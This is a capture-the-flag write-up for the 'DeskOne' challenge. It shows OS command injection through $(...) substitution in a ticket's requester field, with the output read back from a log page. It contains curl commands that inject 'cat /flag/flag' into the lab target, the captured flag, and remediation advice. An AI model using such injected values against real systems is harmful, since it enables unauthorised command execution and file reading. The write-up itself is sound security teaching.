# DeskOne - OS command injection via command substitution (output in the log)

| | |
|---|---|
| **Challenge** | DeskOne |
| **Category** | INJ |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://inj7.chal.deti:8046 |
| **Bug** | CWE-78 - OS command injection via `$(...)` while building a log line |

## Hint
> The desk writes it down, every word in its ledger, even the ones that act.

## Recon
`POST /ticket` (`requester`, `prio`); every ticket is written to a desk log via a
shell string, and **`/log`** shows the last lines. The ticket *response* reveals
nothing - the twist is that **the command output appears in the log**, not the
response.

## Approach
The log line is built through a shell, so **command substitution** `$(...)` runs
while the string is assembled. Put it in the `requester` name; its output is
embedded into the log entry:
```
requester = $(cat /flag/flag)
```

## Exploitation
```bash
curl -s --data-urlencode 'requester=$(cat /flag/flag)' --data-urlencode 'prio=low' \
  http://inj7.chal.deti:8046/ticket -o /dev/null
curl -s http://inj7.chal.deti:8046/log | grep -oE 'flag\{[^}]*\}'
```

## Flag
```
flag{e6889a708450d42994f664aeae6e5a36}
```

## For the report
- **Surviving substitution form:** `$(...)` passed the filter (backtick `` `...` ``
  is the fallback). The sanitizer stripped some of `; | & ( )` etc. but left the
  command-substitution construct intact.
- **Where the output landed and why not the response:** the injected substitution
  runs *when the log line is composed*, so the output is written into the **log
  entry** (visible on `/log`) - the ticket response is built separately and shows
  nothing interesting.
- **Fix:** write logs with a **logging library / file API**, never by shelling
  out - no shell anywhere near a log line. (And as always, allowlist/validate
  the field; don't rely on a character blacklist.)

## Root cause & remediation
- **Cause:** untrusted `requester` is interpolated into a shell string used to
  append to a log (CWE-78); a "harmless" log write became an RCE sink.
- **Fix:** structured logging (no shell); if a shell is unavoidable, `shell=False`
  + argv list; least-privilege runtime.
